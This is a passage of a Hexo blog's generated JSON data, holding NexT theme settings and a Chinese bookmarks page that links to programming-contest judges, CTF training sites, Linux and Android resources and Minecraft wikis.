50px;\n\t}\n}\n</style>\n\n\n\n\n\n\n\n\n","next":{"override":false,"reminder":false,"cache":{"enable":true},"minify":true,"custom_file_path":{"sidebar":"source/_data/sidebar.swig"},"favicon":{"small":"//cdn.file.todest.cn/blog/user/logo.ico","medium":"//cdn.file.todest.cn/blog/user/logo.ico","apple_touch_icon":"//cdn.file.todest.cn/blog/user/logo.ico","safari_pinned_tab":"//cdn.file.todest.cn/blog/user/logo.ico","ms_browserconfig":"//cdn.file.todest.cn/blog/user/logo.ico"},"rss":null,"footer":{"icon":{"name":"user","animated":false,"color":"#808080"},"copyright":null,"powered":{"enable":true,"version":true},"theme":{"enable":true,"version":true},"beian":{"enable":false,"icp":null,"gongan_id":null,"gongan_num":null,"gongan_icon_url":null}},"creative_commons":{"license":"by-nc-sa","sidebar":false,"post":false,"language":null},"scheme":"Gemini","menu":{"home":"/ || home","about":"/about/ || user","tags":"/tags/ || tags","categories":"/categories/ || th","archives":"/archives/ || archive","相册":"/photo/ || photo","链接":"/links/ || link","留言":"/bbs/ || comments"},"menu_settings":{"icons":true,"badges":true},"sidebar":{"position":"left","display":"post","offset":12,"onmobile":false},"avatar":{"url":"https://s.gravatar.com/avatar/4756cb352ec7f58884fdc0c219ea00dc?s=80","rounded":false,"rotated":false},"site_state":true,"social":{"GitHub":"https://github.com/todest || github","E-Mail":"mailto:todest@qq.com || envelope","QQ":"http://wpa.qq.com/msgrd?v=3&uin=1123792492 || qq","Facebook":"https://www.facebook.com/ultrasurreal || facebook","StackOverflow":"https://stackoverflow.com/users/11422695 || stack-overflow","Instagram":"https://www.instagram.com/yonghangguo/ || instagram"},"social_icons":{"enable":true,"icons_only":true,"transition":true},"links_settings":{"icon":"link","title":"Links","layout":"inline"},"links":{"BoilTask":"https://boiltask.com","Codancer":"https://www.cnblogs.com/codancer","Colsrch":"https://colsrch.cn","执念":"https://blog.wzy1999.wang","Des_tiny":"https://anyway521.github.io","Drew":"https://cndrew.cn","rookie6":"https://rookie6.github.io","LuoZui":"https://www.lzphi.cn","Sky":"https://angelni.github.io","一Wa哇一天":"https://blogzhy.cn","Jinqimu":"https://jinqimu.xyz","FuZhiyuan":"https://fuzhiyuan.github.io","RuiRui":"https://pipakacha.com"},"toc":{"enable":true,"number":true,"wrap":false,"expand_all":false,"max_depth":6},"chat":{"enable":false,"icon":"comment","text":"Chat"},"excerpt_description":true,"auto_excerpt":{"enable":false,"length":150},"read_more_btn":true,"post_meta":{"item_text":true,"created_at":true,"updated_at":{"enable":true,"another_day":true},"categories":true},"symbols_count_time":{"separated_meta":true,"item_text_post":true,"item_text_total":false,"awl":4,"wpm":275},"tag_icon":false,"reward_settings":{"enable":true,"animation":true,"comment":"赏点呗！"},"reward":{"wechatpay":"//cdn.file.todest.cn/blog/user/wechatpay.jpg","alipay":"//cdn.file.todest.cn/blog/user/alipay.jpg","bitcoin":"//cdn.file.todest.cn/blog/user/bitcoin.png"},"related_posts":{"enable":false,"title":null,"display_in_home":false,"params":{"maxCount":5}},"post_edit":{"enable":false,"url":"https://github.com/user-name/repo-name/tree/branch-name/subdirectory-name"},"cheers":true,"tagcloud":{"min":12,"max":30,"start":"#ccc","end":"#111","amount":200},"calendar":{"calendar_id":"<required>","api_key":"<required>","orderBy":"startTime","offsetMax":24,"offsetMin":4,"showDeleted":false,"singleEvents":true,"maxResults":250},"text_align":{"desktop":"justify","mobile":"justify"},"mobile_layout_economy":false,"android_chrome_color":"#222","safari_rainbow":false,"custom_logo":null,"codeblock":{"highlight_theme":"normal","copy_button":{"enable":true,"show_result":true,"style":null}},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"reading_progress":{"enable":false,"position":"top","color":"#37c6c0","height":"3px"},"bookmark":{"enable":false,"color":"#222","save":"auto"},"github_banner":{"enable":true,"permalink":"https://github.com/yourname","title":"Follow me on GitHub"},"font":{"enable":false,"host":null,"global":{"external":true,"family":"Lato","size":null},"title":{"external":true,"family":null,"size":null},"headings":{"external":true,"family":null,"size":null},"posts":{"external":true,"family":null},"codes":{"external":true,"family":null}},"disable_baidu_transformation":false,"canonical":true,"seo":true,"index_with_subtitle":false,"exturl":false,"google_site_verification":null,"bing_site_verification":null,"yandex_site_verification":null,"baidu_site_verification":null,"baidu_push":false,"math":{"per_page":false,"mathjax":{"enable":true,"mhchem":false},"katex":{"enable":false,"copy_tex":false}},"pjax":false,"fancybox":true,"mediumzoom":false,"lazyload":true,"pangu":false,"quicklink":{"enable":false,"home":true,"archive":true,"delay":true,"timeout":3000,"priority":true,"ignores":null},"comments":{"style":"tabs","active":null,"storage":true,"nav":null},"disqus":{"enable":false,"shortname":null,"count":true,"lazyload":false},"disqusjs":{"enable":false,"api":null,"apikey":null,"shortname":null},"changyan":{"enable":false,"appid":null,"appkey":null},"valine":{"enable":true,"appid":"NNOFYEbCjmMJUqInK2zEpetd-gzGzoHsz","appkey":"Q474k3XvUzlPbRG5bOyNCxVt","notify":false,"verify":false,"placeholder":"写点什么？","avatar":"mm","guest_info":"nick,mail,link","pageSize":10,"language":null,"visitor":false,"comment_count":true,"recordIP":false,"serverURLs":null},"livere_uid":null,"gitalk":{"enable":false,"github_id":null,"repo":null,"client_id":null,"client_secret":null,"admin_user":null,"distraction_free_mode":true,"language":null},"rating":{"enable":false,"id":null,"color":"fc6423"},"add_this_id":null,"google_analytics":{"tracking_id":null,"localhost_ignored":true,"only_pageview":false},"baidu_analytics":null,"growingio_analytics":null,"cnzz_siteid":null,"tencent_analytics":null,"tencent_mta":null,"leancloud_visitors":{"enable":false,"app_id":null,"app_key":null,"security":true,"betterPerformance":false},"firestore":{"enable":false,"collection":"articles","apiKey":null,"projectId":null},"busuanzi_count":{"enable":true,"total_visitors":true,"total_visitors_icon":"user","total_views":true,"total_views_icon":"eye","post_views":true,"post_views_icon":"eye"},"algolia_search":{"enable":false,"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"local_search":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":true,"preload":true},"swiftype_key":null,"chatra":{"enable":false,"async":true,"id":null},"tidio":{"enable":false,"key":null},"note":{"style":"simple","icons":false,"border_radius":3,"light_bg_offset":0},"tabs":{"transition":{"tabs":false,"labels":true},"border_radius":0},"pdf":{"enable":false,"height":"500px"},"mermaid":{"enable":false,"theme":"forest"},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"pace":{"enable":false,"theme":"minimal"},"three":{"enable":false,"three_waves":false,"canvas_lines":false,"canvas_sphere":false},"canvas_nest":{"enable":false,"onmobile":true,"color":"0,0,255","opacity":0.5,"zIndex":-1,"count":99},"canvas_ribbon":{"enable":false,"size":300,"alpha":0.6,"zIndex":-1},"vendors":{"_internal":"lib","anime":null,"fontawesome":null,"mathjax":null,"mhchem":null,"katex":null,"copy_tex_js":null,"copy_tex_css":null,"pjax":null,"jquery":null,"fancybox":null,"fancybox_css":null,"mediumzoom":null,"lazyload":null,"pangu":null,"quicklink":null,"disqusjs_js":null,"disqusjs_css":null,"valine":null,"gitalk_js":null,"gitalk_css":null,"algolia_instant_js":null,"algolia_instant_css":null,"pdfobject":null,"mermaid":null,"velocity":null,"velocity_ui":null,"pace":null,"pace_css":null,"three":null,"three_waves":null,"canvas_lines":null,"canvas_sphere":null,"canvas_nest":null,"canvas_nest_nomobile":null,"canvas_ribbon":null},"css":"css","js":"js","images":"images","crash_cheat":true,"clicklove":true,"snow":false}}},"length":0,"excerpt":"","more":""},{"title":"链接","type":"links","_content":"# 在线工具\n * [在线工具 - 程序员的工具箱](https://tool.lu/)\n * [The On-Line Encyclopedia of Integer Sequences® (OEIS®)](http://oeis.org/)\n * [Ubuntu Pastebin](https://paste.ubuntu.com/)\n * [dpaste: New](http://dpaste.com/)\n\n# ACM\n## Online Judge\n### Public\n * [Virtual Judge](https://vjudge.net/)\n * [Codeforces](https://codeforces.com/)\n * [牛客网 - 互联网求职神器和备考学习平台](https://www.nowcoder.com/)\n * [登录-51Nod](https://www.51nod.com/)\n * [首页 - 洛谷 | 计算机科学教育新生态](https://www.luogu.org/)\n * [计蒜客 - 学习面向未来的计算机科学](https://www.jisuanke.com/)\n * [首页 - LibreOJ](https://loj.ac/)\n * [hihoCoder](https://hihocoder.com/)\n * [OpenJudge - 百练 - 首页](http://bailian.openjudge.cn/)\n * [PTA | 程序设计类实验辅助教学平台](https://pintia.cn/)\n\n### University\n * [HPU Online Judge](https://hpuoj.com/)\n * [Welcome to Hangzhou Dianzi University Online Judge](http://acm.hdu.edu.cn/)\n * [首页-练习场 - ACM在线评测系统](http://nyoj.top/)\n * [ZZULIOJ](http://acm.zzuli.edu.cn/)\n * [ZZNUOJ](http://acm.hi-54.com/index.php)\n\n## Blogger\n * [ACM-高精度模板(综合篇) - 哇哈哈的专栏 - CSDN博客](https://blog.csdn.net/u013615904/article/details/43373601)\n\n# CTF\n## 社区\n * [首页 - 微步在线威胁情报社区](https://x.threatbook.cn/)\n * [CTF_网络安全交流_白帽黑客论坛_BugkuCTF论坛](https://www.bugku.com/)\n * [HackFun](https://hackfun.org/)\n * [Chrome 控制台不完全指南 - 刘哇勇 - 博客园](http://www.cnblogs.com/Wayou/p/chrome-console-tips-and-tricks.html)\n * [RAR“秒破”教程](https://www.52pojie.cn/thread-188750-1-1.html)\n\n## 工具\n * [CTF资源库|CTF工具下载|CTF工具包|CTF工具集合](https://www.ctftools.com/down/)\n * [针对CTF，大家都是怎么训练的？ - 知乎](https://www.zhihu.com/question/30505597/answer/72163029)\n\n## 训练\n * [BugkuCTF - 练习平台](https://ctf.bugku.com)\n * [南京邮电大学网络攻防训练平台](http://ctf.nuptzj.cn/)\n * [网络安全实验室|网络信息安全攻防学习平台](http://hackinglab.cn/)\n * [Dashboard | HackerRank](https://www.hackerrank.com/)\n * [[WeChall] About WeChall](http://www.wechall.net/)\n\n# Linux\n * [Linux命令大全(手册)_Linux常用命令行实例详解_Linux命令学习手册](http://man.linuxde.net/)\n\n# Windows\n## Office\n * [Excel 帮助 - Office 支持](https://support.office.com/zh-cn/excel?ui=zh-CN&rs=zh-CN&ad=CN&fromAR=1)\n\n## UTAU\n * [哈鲁鲁的UTAU教程站](http://utaujc.lofter.com/)\n * [歌声合成工具UTAU下载页面](http://utau.vocalover.com/)\n\n## SSL\n * [FreeSSL首页 - FreeSSL.org 一个申请免费HTTPS证书的网站](https://freessl.cn/)\n * [自签名免费SSL证书签发-中国数字证书CHINASSL](https://www.chinassl.net/ssltools/free-ssl.html)\n\n# 安卓\n## ADB\n * [Awesome Adb——一份超全超详细的 ADB 用法大全 - Android - 掘金](https://juejin.im/entry/57c00fe4c4c971006179838a#%E7%94%B5%E6%BA%90%E9%94%AE)\n\n# Robots\n * [图灵机器人-智能好用的聊天机器人](http://www.turingapi.com/)\n * [酷Q - 酷Q社区](https://cqp.cc/forum.php?gid=71)\n\n# 区块链\n## BTC\n * [Blockchain - 最可信的加密货币公司](https://www.blockchain.com/)\n\n# 游戏\n## Minecraft\n### Resource Pack\n * [Shader Packs | Minecraft Shaders Wiki | FANDOM powered by Wikia](https://shaders.fandom.com/wiki/Shader_Packs)\n * [Minecraft Mod Downloads](https://www.minecraftmoddownloads.com/)\n * [Resource Packs for Minecraft | Texture Packs](https://resourcepack.net/)\n * [[技术性存档修改工具]NBT Explorer](http://www.mcbbs.net/forum.php?mod=viewthread&tid=306895&page=1&authorid=178523)\n\n### Blogger\n * [RedstoneMachineryCommunication - 红石机械交流促进会](http://www.rmcteam.org/)\n\n### Wiki\n * [中文Minecraft Wiki - 最详细的官方我的世界百科](https://minecraft-zh.gamepedia.com/Minecraft_Wiki)\n * [MC百科|最大的Minecraft中文MOD百科](https://www.mcmod.cn/)\n * [Minecraft ID List](https://minecraft-ids.grahamedgecombe.com/)\n\n## 小游戏\n * [Mikutap](https://blog.todest.cn/games/mikutap)\n * [Patatap](https://patatap.com/)\n * [Snake](https://blog.todest.cn/games/snake)","source":"links/index.md","raw":"---\ntitle: 链接\ntype: \"links\"\n---\n# 在线工具\n * [在线工具 - 程序员的工具箱](https://tool.lu/)\n * [The On-Line Encyclopedia of Integer Sequences® (OEIS®)](http://oeis.org/)\n * [Ubuntu Pastebin](https://paste.ubuntu.com/)\n * [dpaste: New](http://dpaste.com/)\n\n# ACM\n## Online Judge\n### Public\n * [Virtual Judge](https://vjudge.net/)\n * [Codeforces](https://codeforces.com/)\n * [牛客网 - 互联网求职神器和备考学习平台](https://www.nowcoder.com/)\n * [登录-51Nod](https://www.51nod.com/)\n * [首页 - 洛谷 | 计算机科学教育新生态](https://www.luogu.org/)\n * [计蒜客 - 学习面向未来的计算机科学](https://www.jisuanke.com/)\n * [首页 - LibreOJ](https://loj.ac/)\n * [hihoCoder](https://hihocoder.com/)\n * [OpenJudge - 百练 - 首页](http://bailian.openjudge.cn/)\n * [PTA | 程序设计类实验辅助教学平台](https://pintia.cn/)\n\n### University\n * [HPU Online Judge](https://hpuoj.com/)\n * [Welcome to Hangzhou Dianzi University Online Judge](http://acm.hdu.edu.cn/)\n * [首页-练习场 - ACM在线评测系统](http://nyoj.top/)\n * [ZZULIOJ](http://acm.zzuli.edu.cn/)\n * [ZZNUOJ](http://acm.hi-54.com/index.php)\n\n## Blogger\n * [ACM-高精度模板(综合篇) - 哇哈哈的专栏 - CSDN博客](https://blog.csdn.net/u013615904/article/details/43373601)\n\n# CTF\n## 社区\n * [首页 - 微步在线威胁情报社区](https://x.threatbook.cn/)\n * [CTF_网络安全交流_白帽黑客论坛_BugkuCTF论坛](https://www.bugku.com/)\n * [HackFun](https://hackfun.org/)\n * [Chrome 控制台不完全指南 - 刘哇勇 - 博客园](http://www.cnblogs.com/Wayou/p/chrome-console-tips-and-tricks.html)\n * [RAR“秒破”教程](https://www.52pojie.cn/thread-188750-1-1.html)\n\n## 工具\n * [CTF资源库|CTF工具下载|CTF工具包|CTF工具集合](https://www.ctftools.com/down/)\n * [针对CTF，大家都是怎么训练的？ - 知乎](https://www.zhihu.com/question/30505597/answer/72163029)\n\n## 训练\n * [BugkuCTF - 练习平台](https://ctf.bugku.com)\n * [南京邮电大学网络攻防训练平台](http://ctf.nuptzj.cn/)\n * [网络安全实验室|网络信息安全攻防学习平台](http://hackinglab.cn/)\n * [Dashboard | HackerRank](https://www.hackerrank.com/)\n * [[WeChall] About WeChall](http://www.wechall.net/)\n\n# Linux\n * [Linux命令大全(手册)_Linux常用命令行实例详解_Linux命令学习手册](http://man.linuxde.net/)\n\n# Windows\n## Office\n * [Excel 帮助 - Office 支持](https://support.office.com/zh-cn/excel?ui=zh-CN&rs=zh-CN&ad=CN&fromAR=1)\n\n## UTAU\n * [哈鲁鲁的UTAU教程站](http://utaujc.lofter.com/)\n * [歌声合成工具UTAU下载页面](http://utau.vocalover.com/)\n\n## SSL\n * [FreeSSL首页 - FreeSSL.org 一个申请免费HTTPS证书的网站](https://freessl.cn/)\n * [自签名免费SSL证书签发-中国数字证书CHINASSL](https://www.chinassl.net/ssltools/free-ssl.html)\n\n# 安卓\n## ADB\n * [Awesome Adb——一份超全超详细的 ADB 用法大全 - Android - 掘金](https://juejin.im/entry/57c00fe4c4c971006179838a#%E7%94%B5%E6%BA%90%E9%94%AE)\n\n# Robots\n * [图灵机器人-智能好用的聊天机器人](http://www.turingapi.com/)\n * [酷Q - 酷Q社区](https://cqp.cc/forum.php?gid=71)\n\n# 区块链\n## BTC\n * [Blockchain - 最可信的加密货币公司](https://www.blockchain.com/)\n\n# 游戏\n## Minecraft\n### Resource Pack\n * [Shader Packs | Minecraft Shaders Wiki | FANDOM powered by Wikia](https://shaders.fandom.com/wiki/Shader_Packs)\n * [Minecraft Mod Downloads](https://www.minecraftmoddownloads.com/)\n * [Resource Packs for Minecraft | Texture Packs](https://resourcepack.net/)\n * [[技术性存档修改工具]NBT Explorer](http://www.mcbbs.net/forum.php?mod=viewthread&tid=306895&page=1&authorid=178523)\n\n### Blogger\n * [RedstoneMachineryCommunication - 红石机械交流促进会](http://www.rmcteam.org/)\n\n### Wiki\n * [中文Minecraft Wiki - 最详细的官方我的世界百科](https://minecraft-zh.gamepedia.com/Minecraft_Wiki)\n * [MC百科|最大的Minecraft中文MOD百科](https://www.mcmod.cn/)\n * [Minecraft ID List](https://minecraft-ids.grahamedgecombe.com/)\n\n## 小游戏\n * [Mikutap](https://blog.todest.cn/games/mikutap)\n * [Patatap](https://patatap.com/)\n * [Snake](https://blog.todest.cn/games/snake)","date":"2019-04-16T14:10:01.081Z","updated":"2019-04-16T14:10:01.081Z","path":"links/index.html","comments":1,"layout":"page","_id":"ckieexkab000aqse577x6htm5","content":"<h1 id=\"在线工具\"><a href=\"#在线工具\" class=\"headerlink\" title=\"在线工具\"></a>在线工具</h1><ul>\n<li><a href=\"https://tool.lu/\">在线工具 - 程序员的工具箱</a></li>\n<li><a href=\"http://oeis.org/\">The On-Line Encyclopedia of Integer Sequences® (OEIS®)</a></li>\n<li><a href=\"https://paste.ubuntu.com/\">Ubuntu Pastebin</a></li>\n<li><a href=\"http://dpaste.com/\">dpaste: New</a></li>\n</ul>\n<h1 id=\"ACM\"><a href=\"#ACM\" class=\"headerlink\" title=\"ACM\"></a>ACM</h1><h2 id=\"Online-Judge\"><a href=\"#Online-Judge\" class=\"headerlink\" title=\"Online Judge\"></a>Online Judge</h2><h3 id=\"Public\"><a href=\"#Public\" class=\"headerlink\" title=\"Public\"></a>Public</h3><ul>\n<li><a href=\"https://vjudge.net/\">Virtual Judge</a></li>\n<li><a href=\"https://codeforces.com/\">Codeforces</a></li>\n<li><a href=\"https://www.nowcoder.com/\">牛客网 - 互联网求职神器和备考学习平台</a></li>\n<li><a href=\"https://www.51nod.com/\">登录-51Nod</a></li>\n<li><a href=\"https://www.luogu.org/\">首页 - 洛谷 | 计算机科学教育新生态</a></li>\n<li><a href=\"https://www.jisuanke.com/\">计蒜客 - 学习面向未来的计算机科学</a></li>\n<li><a href=\"https://loj.ac/\">首页 - LibreOJ</a></li>\n<li><a href=\"https://hihocoder.com/\">hihoCoder</a></li>\n<li><a href=\"http://bailian.openjudge.cn/\">OpenJudge - 百练 - 首页</a></li>\n<li><a href=\"https://pintia.cn/\">PTA | 程序设计类实验辅助教学平台</a></li>\n</ul>\n<h3 id=\"University\"><a href=\"#University\" class=\"headerlink\" title=\"University\"></a>University</h3><ul>\n<li><a href=\"https://hpuoj.com/\">HPU Online Judge</a></li>\n<li><a href=\"http://acm.hdu.edu.cn/\">Welcome to Hangzhou Dianzi University Online Judge</a></li>\n<li><a href=\"http://nyoj.top/\">首页-练习场 - ACM在线评测系统</a></li>\n<li><a href=\"http://acm.zzuli.edu.cn/\">ZZULIOJ</a></li>\n<li><a href=\"http://acm.hi-54.com/index.php\">ZZNUOJ</a></li>\n</ul>\n<h2 id=\"Blogger\"><a href=\"#Blogger\" class=\"headerlink\" title=\"Blogger\"></a>Blogger</h2><ul>\n<li><a href=\"https://blog.csdn.net/u013615904/article/details/43373601\">ACM-高精度模板(综合篇) - 哇哈哈的专栏 - CSDN博客</a></li>\n</ul>\n<h1 id=\"CTF\"><a href=\"#CTF\" class=\"headerlink\" title=\"CTF\"></a>CTF</h1><h2 id=\"社区\"><a href=\"#社区\" class=\"headerlink\" title=\"社区\"></a>社区</h2><ul>\n<li><a href=\"https://x.threatbook.cn/\">首页 - 微步在线威胁情报社区</a></li>\n<li><a href=\"https://www.bugku.com/\">CTF_网络安全交流_白帽黑客论坛_BugkuCTF论坛</a></li>\n<li><a href=\"https://hackfun.org/\">HackFun</a></li>\n<li><a href=\"http://www.cnblogs.com/Wayou/p/chrome-console-tips-and-tricks.html\">Chrome 控制台不完全指南 - 刘哇勇 - 博客园</a></li>\n<li><a href=\"https://www.52pojie.cn/thread-188750-1-1.html\">RAR“秒破”教程</a></li>\n</ul>\n<h2 id=\"工具\"><a href=\"#工具\" class=\"headerlink\" title=\"工具\"></a>工具</h2><ul>\n<li><a href=\"https://www.ctftools.com/down/\">CTF资源库|CTF工具下载|CTF工具包|CTF工具集合</a></li>\n<li><a href=\"https://www.zhihu.com/question/30505597/answer/72163029\">针对CTF，大家都是怎么训练的？ - 知乎</a></li>\n</ul>\n<h2 id=\"训练\"><a href=\"#训练\" class=\"headerlink\" title=\"训练\"></a>训练</h2><ul>\n<li><a href=\"https://ctf.bugku.com\">BugkuCTF - 练习平台</a></li>\n<li><a href=\"http://ctf.nuptzj.cn/\">南京邮电大学网络攻防训练平台</a></li>\n<li><a href=\"http://hackinglab.cn/\">网络安全实验室|网络信息安全攻防学习平台</a></li>\n<li><a href=\"https://www.hackerrank.com/\">Dashboard | HackerRank</a></li>\n<li><a href=\"http://www.wechall.net/\">[WeChall] About WeChall</a></li>\n</ul>\n<h1 id=\"Linux\"><a href=\"#Linux\" class=\"headerlink\" title=\"Linux\"></a>Linux</h1><ul>\n<li><a href=\"http://man.linuxde.net/\">Linux命令大全(手册)_Linux常用命令行实例详解_Linux命令学习手册</a></li>\n</ul>\n<h1 id=\"Windows\"><a href=\"#Windows\" class=\"headerlink\" title=\"Windows\"></a>Windows</h1><h2 id=\"Office\"><a href=\"#Office\" class=\"headerlink\" title=\"Office\"></a>Office</h2><ul>\n<li><a href=\"https://support.office.com/zh-cn/excel?ui=zh-CN&amp;rs=zh-CN&amp;ad=CN&amp;fromAR=1\">Excel 帮助 - Office 支持</a></li>\n</ul>\n<h2 id=\"UTAU\"><a href=\"#UTAU\" class=\"headerlink\" title=\"UTAU\"></a>UTAU</h2><ul>\n<li><a href=\"http://utaujc.lofter.com/\">哈鲁鲁的UTAU教程站</a></li>\n<li><a href=\"http://utau.vocalover.com/\">歌声合成工具UTAU下载页面</a></li>\n</ul>\n<h2 id=\"SSL\"><a href=\"#SSL\" class=\"headerlink\" title=\"SSL\"></a>SSL</h2><ul>\n<li><a href=\"https://freessl.cn/\">FreeSSL首页 - FreeSSL.org 一个申请免费HTTPS证书的网站</a></li>\n<li><a href=\"https://www.chinassl.net/ssltools/free-ssl.html\">自签名免费SSL证书签发-中国数字证书CHINASSL</a></li>\n</ul>\n<h1 id=\"安卓\"><a href=\"#安卓\" class=\"headerlink\" title=\"安卓\"></a>安卓</h1><h2 id=\"ADB\"><a href=\"#ADB\" class=\"headerlink\" title=\"ADB\"></a>ADB</h2><ul>\n<li><a href=\"https://juejin.im/entry/57c00fe4c4c971006179838a#%E7%94%B5%E6%BA%90%E9%94%AE\">Awesome Adb——一份超全超详细的 ADB 用法大全 - Android - 掘金</a></li>\n</ul>\n<h1 id=\"Robots\"><a href=\"#Robots\" class=\"headerlink\" title=\"Robots\"></a>Robots</h1><ul>\n<li><a href=\"http://www.turingapi.com/\">图灵机器人-智能好用的聊天机器人</a></li>\n<li><a href=\"https://cqp.cc/forum.php?gid=71\">酷Q - 酷Q社区</a></li>\n</ul>\n<h1 id=\"区块链\"><a href=\"#区块链\" class=\"headerlink\" title=\"区块链\"></a>区块链</h1><h2 id=\"BTC\"><a href=\"#BTC\" class=\"headerlink\" title=\"BTC\"></a>BTC</h2><ul>\n<li><a href=\"https://www.blockchain.com/\">Blockchain - 最可信的加密货币公司</a></li>\n</ul>\n<h1 id=\"游戏\"><a href=\"#游戏\" class=\"headerlink\" title=\"游戏\"></a>游戏</h1><h2 id=\"Minecraft\"><a href=\"#Minecraft\" class=\"headerlink\" title=\"Minecraft\"></a>Minecraft</h2><h3 id=\"Resource-Pack\"><a href=\"#Resource-Pack\" class=\"headerlink\" title=\"Resource Pack\"></a>Resource Pack</h3><ul>\n<li><a href=\"https://shaders.fandom.com/wiki/Shader_Packs\">Shader Packs | Minecraft Shaders Wiki | FANDOM powered by Wikia</a></li>\n<li><a href=\"https://www.minecraftmoddownloads.com/\">Minecraft Mod Downloads</a></li>\n<li><a href=\"https://resourcepack.net/\">Resource Packs for Minecraft | Texture Packs</a></li>\n<li><a href=\"http://www.mcbbs.net/forum.php?mod=viewthread&amp;tid=306895&amp;page=1&amp;authorid=178523\">[技术性存档修改工具]NBT Explorer</a></li>\n</ul>\n<h3 id=\"Blogger-1\"><a href=\"#Blogger-1\" class=\"headerlink\" title=\"Blogger\"></a>Blogger</h3><ul>\n<li><a href=\"http://www.rmcteam.org/\">RedstoneMachineryCommunication - 红石机械交流促进会</a></li>\n</ul>\n<h3 id=\"Wiki\"><a href=\"#Wiki\" class=\"headerlink\" title=\"Wiki\"></a>Wiki</h3><ul>\n<li><a href=\"https://minecraft-zh.gamepedia.com/Minecraft_Wiki\">中文Minecraft Wiki - 最详细的官方我的世界百科</a></li>\n<li><a href=\"https://www.mcmod.cn/\">MC百科|最大的Minecraft中文MOD百科</a></li>\n<li><a href=\"https://minecraft-ids.grahamedgecombe.com/\">Minecraft ID List</a></li>\n</ul>\n<h2 id=\"小游戏\"><a href=\"#小游戏\" class=\"headerlink\" title=\"小游戏\"></a>小游戏</h2><ul>\n<li><a href=\"https://blog.todest.cn/games/mikutap\">Mikutap</a></li>\n<li><a href=\"https://patatap.com/\">Patatap</a></li>\n<li><a href=\"https://blog.todest.cn/games/snake\">Snake</a></li>\n</ul>\n","site":{"data":{"sidebar":"<script src=\"//v1.hitokoto.cn/?encode=js&select=%23hitokoto\" defer></script>\n<style>\n@media all and (orientation : portrait) {\n\t#hitokoto{\n\t\tpadding-left: 50px;\n\t\tpadding-right: 50px;\n\t}\n}\n</style>\n\n\n\n\n\n\n\n\n","next":{"override":false,"reminder":false,"cache":{"enable":true},"minify":true,"custom_file_path":{"sidebar":"source/_data/sidebar.swig"},"favicon":{"small":"//cdn.file.todest.cn/blog/user/logo.ico","medium":"//cdn.file.todest.cn/blog/user/logo.ico","apple_touch_icon":"//cdn.file.todest.cn/blog/user/logo.ico","safari_pinned_tab":"//cdn.file.todest.cn/blog/user/logo.ico","ms_browserconfig":"//cdn.file.todest.cn/blog/user/logo.ico"},"rss":null,"footer":{"icon":{"name":"user","animated":false,"color":"#808080"},"copyright":null,"powered":{"enable":true,"version":true},"theme":{"enable":true,"version":true},"beian":{"enable":false,"icp":null,"gongan_id":null,"gongan_num":null,"gongan_icon_url":null}},"creative_commons":{"license":"by-nc-sa","sidebar":false,"post":false,"language":null},"scheme":"Gemini","menu":{"home":"/ || home","about":"/about/ || user","tags":"/tags/ || tags","categories":"/categories/ || th","archives":"/archives/ || archive","相册":"/photo/ || photo","链接":"/links/ || link","留言":"/bbs/ || comments"},"menu_settings":{"icons":true,"badges":true},"sidebar":{"position":"left","display":"post","offset":12,"onmobile":false},"avatar":{"url":"https://s.gravatar.com/avatar/4756cb352ec7f58884fdc0c219ea00dc?s=80","rounded":false,"rotated":false},"site_state":true,"social":{"GitHub":"https://github.com/todest || github","E-Mail":"mailto:todest@qq.com || envelope","QQ":"http://wpa.qq.com/msgrd?v=3&uin=1123792492 || qq","Facebook":"https://www.facebook.com/ultrasurreal || facebook","StackOverflow":"https://stackoverflow.com/users/11422695 || stack-overflow","Instagram":"https://www.instagram.com/yonghangguo/ || instagram"},"social_icons":{"enable":true,"icons_only":true,"transition":true},"links_settings":{"icon":"link","title":"Links","layout":"inline"},"links":{"BoilTask":"https://boiltask.com","Codancer":"https://www.cnblogs.com/codancer","Colsrch":"https://colsrch.cn","执念":"https://blog.wzy1999.wang","Des_tiny":"https://anyway521.github.io","Drew":"https://cndrew.cn","rookie6":"https://rookie6.github.io","LuoZui":"https://www.lzphi.cn","Sky":"https://angelni.github.io","一Wa哇一天":"https://blogzhy.cn","Jinqimu":"https://jinqimu.xyz","FuZhiyuan":"https://fuzhiyuan.github.io","RuiRui":"https://pipakacha.com"},"toc":{"enable":true,"number":true,"wrap":false,"expand_all":false,"max_depth":6},"chat":{"enable":false,"icon":"comment","text":"Chat"},"excerpt_description":true,"auto_excerpt":{"enable":false,"length":150},"read_more_btn":true,"post_meta":{"item_text":true,"created_at":true,"updated_at":{"enable":true,"another_day":true},"categories":true},"symbols_count_time":{"separated_meta":true,"item_text_post":true,"item_text_total":false,"awl":4,"wpm":275},"tag_icon":false,"reward_settings":{"enable":true,"animation":true,"comment":"赏点呗！"},"reward":{"wechatpay":"//cdn.file.todest.cn/blog/user/wechatpay.jpg","alipay":"//cdn.file.todest.cn/blog/user/alipay.jpg","bitcoin":"//cdn.file.todest.cn/blog/user/bitcoin.png"},"related_posts":{"enable":false,"title":null,"display_in_home":false,"params":{"maxCount":5}},"post_edit":{"enable":false,"url":"https://github.com/user-name/repo-name/tree/branch-name/subdirectory-name"},"cheers":true,"tagcloud":{"min":12,"max":30,"start":"#ccc","end":"#111","amount":200},"calendar":{"calendar_id":"<required>","api_key":"<required>","orderBy":"startTime","offsetMax":24,"offsetMin":4,"showDeleted":false,"singleEvents":true,"maxResults":250},"text_align":{"desktop":"justify","mobile":"justify"},"mobile_layout_economy":false,"android_chrome_color":"#222","safari_rainbow":false,"custom_logo":null,"codeblock":{"highlight_theme":"normal","copy_button":{"enable":true,"show_result":true,"style":null}},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"reading_progress":{"enable":false,"position":"top","color":"#37c6c0","height":"3px"},"bookmark":{"enable":false,"color":"#222","save":"auto"},"github_banner":{"enable":true,"permalink":"https://github.com/yourname","title":"Follow me on 